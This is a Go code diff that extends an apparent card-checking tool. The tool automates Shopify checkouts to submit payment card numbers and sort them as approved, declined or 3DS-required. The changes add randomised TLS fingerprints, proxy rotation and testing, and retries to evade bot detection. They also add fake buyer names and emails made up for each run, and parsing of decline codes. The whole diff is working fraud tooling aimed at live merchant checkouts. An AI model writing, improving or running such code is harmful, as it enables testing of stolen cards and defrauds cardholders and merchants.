+var firstNames = []string{"james", "john", "robert", "michael", "david", "william", "richard", "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen", "nancy", "lisa", "betty", "helen", "sandra", "donald", "carol", "ruth", "sharon", "michelle", "laura", "kimberly", "deborah", "dorothy"}
+var lastNames = []string{"smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "perez", "thompson", "white", "harris", "clark", "lewis", "robinson", "walker", "young", "allen", "king", "wright", "scott"}
+
+func randomFirstName() string {
+	return firstNames[rand.Intn(len(firstNames))]
+}
+
+func randomLastName() string {
+	return lastNames[rand.Intn(len(lastNames))]
+}
+
+func randomEmail(first, last string) string {
+	return fmt.Sprintf("%s%s%d@gmail.com", first, last, 1000+rand.Intn(9000))
+}
+
+func extractSubmitErrorCodes(body string) []string {
+	codes := submitErrorCodeRe.FindAllStringSubmatch(body, -1)
+	seen := make(map[string]struct{}, len(codes))
+	out := make([]string, 0, len(codes))
+	for _, m := range codes {
+		if len(m) > 1 {
+			if _, ok := seen[m[1]]; ok {
+				continue
+			}
+			seen[m[1]] = struct{}{}
+			out = append(out, m[1])
+		}
+	}
+	return out
+}
+
+func containsCode(codes []string, target string) bool {
+	for _, c := range codes {
+		if c == target {
+			return true
+		}
+	}
+	return false
+}
+
 // ──────────────────────── Step 9: PCI session (card tokenisation) ─
 
 func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear int, cvv, shopDomain, proxyURL string) (int, string, error) {
+	formattedNum := formatCardNumber(cardNumber)
 	payload := fmt.Sprintf(`{
   "credit_card": {
     "number": %q,
@@ -827,7 +1436,7 @@ func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear i
     "name": %q
   },
   "payment_session_scope": %q
-}`, cardNumber, cardMonth, cardYear, cvv, cardName, shopDomain)
+}`, formattedNum, cardMonth, cardYear, cvv, cardName, shopDomain)
 
 	req, err := fhttp.NewRequest("POST", "https://checkout.pci.shopifyinc.com/sessions", strings.NewReader(payload))
 	if err != nil {
@@ -850,19 +1459,49 @@ func sendPCISession(identSig, cardNumber, cardName string, cardMonth, cardYear i
 	req.Header.Set("shopify-identification-signature", identSig)
 	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
 
-	// Standalone tls-client for PCI endpoint
-	pciOptions := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(30),
-		tls_client.WithClientProfile(profiles.Chrome_124),
+	// Retry the PCI tokenisation with a fresh random TLS profile each attempt,
+	// falling back to a no-proxy client if the proxy is failing.
+	var resp *fhttp.Response
+	var lastErr error
+	for attempt := 0; attempt < 5; attempt++ {
+		pciOptions := []tls_client.HttpClientOption{
+			tls_client.WithTimeoutSeconds(30),
+			tls_client.WithClientProfile(randomTLSProfile()),
+		}
+		if proxyURL != "" {
+			pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
+		}
+		pciClient, cErr := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
+		if cErr != nil {
+			lastErr = cErr
+			continue
+		}
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		resp, err = doWithRetry(pciClient, req, 1)
+		if err == nil {
+			break
+		}
+		lastErr = err
+		if attempt < 4 {
+			time.Sleep(2 * time.Second)
+		}
 	}
-	if proxyURL != "" {
-		pciOptions = append(pciOptions, tls_client.WithProxyUrl(proxyURL))
+	if err != nil && proxyURL != "" {
+		if req.GetBody != nil {
+			if rb, gbErr := req.GetBody(); gbErr == nil {
+				req.Body = rb
+			}
+		}
+		fallbackClient, fbErr := createNoProxyClient()
+		if fbErr == nil {
+			resp, err = doWithRetry(fallbackClient, req, 2)
+		}
 	}
-	pciClient, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), pciOptions...)
-	if err != nil {
-		return 0, "", fmt.Errorf("failed to create PCI tls client: %w", err)
-	}
-	resp, err := pciClient.Do(req)
+	_ = lastErr
 	if err != nil {
 		return 0, "", fmt.Errorf("POST PCI session: %w", err)
 	}
@@ -1771,7 +2410,8 @@ func sendSubmitForCompletion(
 
 // Matches actual error objects: "code":"X","localizedMessage":"Y","nonLocalizedMessage":"Z"
 var proposalErrorRe = regexp.MustCompile(`"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"`)
-var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"`)
+var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled|SubmitRejected)"`)
+var submitErrorCodeRe = regexp.MustCompile(`"code"\s*:\s*"([A-Z][A-Z0-9_]*)"`)
 var errMissingReceiptID = errors.New("submit response missing receiptId")
 var errStoreIncompatible = errors.New("store incompatible")
 
@@ -1814,8 +2454,9 @@ func checkSubmitErrors(status int, body string) {
 // saveDebugResponse overwrites a fixed-name file with the latest response body.
 // Files are written to the current working directory for easy inspection.
 func saveDebugResponse(name, body string) {
-	fname := name + "_response.json"
-	_ = os.WriteFile(fname, []byte(body), 0644)
+	_ = os.MkdirAll("debug", 0o755)
+	safe := strings.NewReplacer("/", "_", `\`, "_", ":", "_").Replace(name)
+	_ = os.WriteFile(filepath.Join("debug", safe+"_response.json"), []byte(body), 0o644)
 }
 
 func extractReceiptStatusCode(pollBody, receiptType string) string {
@@ -1917,12 +2558,17 @@ func normalizeProxy(raw string) (string, error) {
 	}
 
 	if !strings.Contains(p, "://") {
-		parts := strings.Split(p, ":")
-		if len(parts) == 4 {
-			// host:port:user:pass -> http://user:pass@host:port
-			p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
-		} else {
+		if strings.Contains(p, "@") {
+			// user:pass@host:port -> http://user:pass@host:port
 			p = "http://" + p
+		} else {
+			parts := strings.Split(p, ":")
+			if len(parts) == 4 {
+				// host:port:user:pass -> http://user:pass@host:port
+				p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
+			} else {
+				p = "http://" + p
+			}
 		}
 	}
 
@@ -1934,10 +2580,32 @@ func normalizeProxy(raw string) (string, error) {
 	return p, nil
 }
 
+var proxyTestURLs = []string{
+	"https://ip-api.com/json",
+	"https://httpbin.org/ip",
+	"https://api.ipify.org?format=json",
+	"https://ifconfig.me/all.json",
+}
+
 func testProxy(proxyURL string) error {
+	var lastErr error
+	for attempt := 0; attempt < 3; attempt++ {
+		if attempt > 0 {
+			time.Sleep(time.Duration(500*attempt) * time.Millisecond)
+		}
+		err := testProxyOnce(proxyURL)
+		if err == nil {
+			return nil
+		}
+		lastErr = err
+	}
+	return lastErr
+}
+
+func testProxyOnce(proxyURL string) error {
 	options := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(5),
-		tls_client.WithClientProfile(profiles.Chrome_124),
+		tls_client.WithTimeoutSeconds(15),
+		tls_client.WithClientProfile(randomTLSProfile()),
 		tls_client.WithProxyUrl(proxyURL),
 	}
 	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
@@ -1945,25 +2613,19 @@ func testProxy(proxyURL string) error {
 		return fmt.Errorf("create proxy test client: %w", err)
 	}
 
-	resp, err := client.Get("https://api.ipify.org?format=json")
-	if err != nil {
-		return fmt.Errorf("proxy test request failed: %w", err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("proxy test returned status %d", resp.StatusCode)
-	}
-
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("reading proxy test response: %w", err)
-	}
-	if len(strings.TrimSpace(string(body))) == 0 {
-		return fmt.Errorf("proxy test returned empty body")
+	for _, testURL := range proxyTestURLs {
+		resp, err := client.Get(testURL)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if resp.StatusCode == http.StatusOK && len(strings.TrimSpace(string(body))) >= 2 {
+			return nil
+		}
 	}
 
-	return nil
+	return fmt.Errorf("proxy test failed all endpoints")
 }
 
 func findWorkingProxies(proxies []string) ([]string, error) {
@@ -2018,11 +2680,11 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		return result, err
 	}
 
-	// Fresh tls-client (curl-cffi equivalent) with its own cookie jar per run
+	// Fresh tls-client with its own cookie jar per run and a random Chrome profile
 	jar := tls_client.NewCookieJar()
 	clOptions := []tls_client.HttpClientOption{
 		tls_client.WithTimeoutSeconds(30),
-		tls_client.WithClientProfile(profiles.Chrome_124),
+		tls_client.WithClientProfile(randomTLSProfile()),
 		tls_client.WithCookieJar(jar),
 	}
 	if proxyURL != "" {
@@ -2046,23 +2708,37 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 
 	// Step 1
-	checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
+	var effectiveShopURL string
+	effectiveShopURL, checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
 	if err != nil {
 		result.Status = StatusError
 		result.Retryable = true
 		result.Error = fmt.Errorf("Step 1 failed: %w", err)
 		return result, result.Error
 	}
+	// Use the effective (possibly custom-domain) shop URL for all subsequent requests
+	// so that Origin/Referer/GraphQL endpoints match the domain where the checkout loaded.
+	if effectiveShopURL != shopURL {
+		shopURL = effectiveShopURL
+		siteName = strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")
+		result.SiteName = siteName
+	}
 	stableID := extractStableID(checkoutHTML)
 	buildID := extractCommitSha(checkoutHTML)
 	sourceToken := extractSourceToken(checkoutHTML)
+
+	if htmlCurrency := extractCurrencyFromHTML(checkoutHTML); htmlCurrency != "" {
+		currency = htmlCurrency
+	}
+	if htmlPrice := extractCheckoutPriceFromHTML(checkoutHTML); htmlPrice != "" {
+		price = htmlPrice
+	}
 	if stableID == "" || buildID == "" || sourceToken == "" {
 		saveDebugResponse("checkout_html_step1", checkoutHTML)
-		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
-			stableID != "", buildID != "", sourceToken != "", shopURL)
+		pageType := sniffPageType(checkoutHTML)
 		result.Status = StatusError
 		result.Retryable = true
-		result.Error = fmt.Errorf("Step 1 failed: missing stableId, buildId, or sourceToken")
+		result.Error = fmt.Errorf("Step 1 — checkout page reported: %s (len=%d, landed=%s)", pageType, len(checkoutHTML), checkoutURL)
 		return result, result.Error
 	}
 
@@ -2163,7 +2839,9 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	}
 
 	// Step 5
-	email := "sadsjahk@gmail.com"
+	firstName := randomFirstName()
+	lastName := randomLastName()
+	email := randomEmail(firstName, lastName)
 	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country)
 	if err != nil {
 		result.Status = StatusError
@@ -2180,6 +2858,8 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 
 	// Step 6
 	addr := addressForCountry(country)
+	addr.FirstName = firstName
+	addr.LastName = lastName
 	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country)
 	if err != nil {
 		result.Status = StatusError
@@ -2229,7 +2909,7 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		return result, result.Error
 	}
 
-	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
+	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, fmt.Sprintf("%s %s", addr.FirstName, addr.LastName), cardMonth, cardYear, cardCVV, siteName, proxyURL)
 	_ = pciStatus
 	if err != nil {
 		result.Status = StatusError
@@ -2303,6 +2983,44 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 	saveDebugResponse("submit", submitBody)
 	checkSubmitErrors(submitStatus, submitBody)
 
+	// Handle SubmitRejected — extract the payment error codes to classify
+	// the decline (invalid card, brand not supported, etc.) instead of a
+	// generic "missing receiptId" failure.
+	if mt := submitTypeRe.FindStringSubmatch(submitBody); len(mt) > 1 && mt[1] == "SubmitRejected" {
+		codes := extractSubmitErrorCodes(submitBody)
+		if len(codes) > 0 {
+			allCodes := strings.Join(codes, ", ")
+			cardBrandNotSupported := containsCode(codes, "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED")
+			cardInvalid := containsCode(codes, "PAYMENTS_CREDIT_CARD_NUMBER_INVALID") ||
+				containsCode(codes, "PAYMENTS_CREDIT_CARD_EXPIRATION_DATE_INVALID") ||
+				containsCode(codes, "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE")
+
+			if cardInvalid {
+				result.Status = StatusDeclined
+				result.StatusCode = codes[0]
+				result.Error = fmt.Errorf("declined: %s (codes: %s)", codes[0], allCodes)
+				result.Retryable = false
+				return result, result.Error
+			}
+			if cardBrandNotSupported {
+				result.Status = StatusError
+				result.StatusCode = "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED"
+				result.Error = fmt.Errorf("rejected: %s (codes: %s)", "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED", allCodes)
+				result.Retryable = true
+				return result, result.Error
+			}
+			result.Status = StatusError
+			result.StatusCode = codes[0]
+			result.Error = fmt.Errorf("Step 10 rejected: %s (codes: %s)", codes[0], allCodes)
+			result.Retryable = true
+			return result, result.Error
+		}
+		result.Status = StatusError
+		result.Error = fmt.Errorf("%w: Step 10 SubmitRejected with no error codes (shop=%s)", errMissingReceiptID, shopURL)
+		result.Retryable = true
+		return result, result.Error
+	}
+
 	receiptID := extractReceiptID(submitBody)
 	if receiptID == "" {
 		result.Status = StatusError
@@ -2360,7 +3078,14 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 		if receiptType == "ActionRequiredReceipt" {
 			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
 			result.Status = StatusApproved
-			result.StatusCode = "APPROVED"
+			result.StatusCode = "3DS_REQUIRED"
+			return result, nil
+		}
+		// 3DS fallback detection (string matching) — some stores return a
+		// challenge frame instead of a typed ActionRequiredReceipt.
+		if strings.Contains(pollBody, "CompletePaymentChallenge") || strings.Contains(pollBody, "/stripe/authentications/") {
+			result.Status = StatusApproved
+			result.StatusCode = "3DS_REQUIRED"
 			return result, nil
 		}
 		if receiptType == "FailedReceipt" {
@@ -2381,8 +3106,8 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
 				return result, nil
 			case "CAPTCHA_REQUIRED":
 				result.Status = StatusDeclined
-				result.StatusCode = errorCode
-				result.Error = fmt.Errorf("declined: %s", errorCode)
+				result.StatusCode = "CARD_DECLINED"
+				result.Error = fmt.Errorf("declined: CARD_DECLINED")
 				return result, result.Error
 			case "GENERIC_ERROR":
 				result.Status = StatusDeclined
